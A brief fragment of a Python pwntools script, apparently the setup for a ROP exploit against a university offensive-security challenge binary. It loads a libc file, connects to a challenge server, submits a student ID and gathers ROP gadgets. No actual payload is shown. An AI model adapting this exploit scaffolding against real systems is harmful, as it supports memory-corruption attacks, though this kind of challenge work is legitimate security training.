...
local_bin = "./rop"
remote_bin = "~/rop"  # For ssh
libc = ELF("./libc-2.23.so")  # ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
...
if LOCAL:
    ...
    p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1343)  # start the vuln binary
    netid = 'pk1898'
    p.sendline(netid)
    p.recvline()  # eat interstitial
    elf = ELF(local_bin)  # Extract data from binary
    rop = ROP(elf)  # Find ROP gadgets
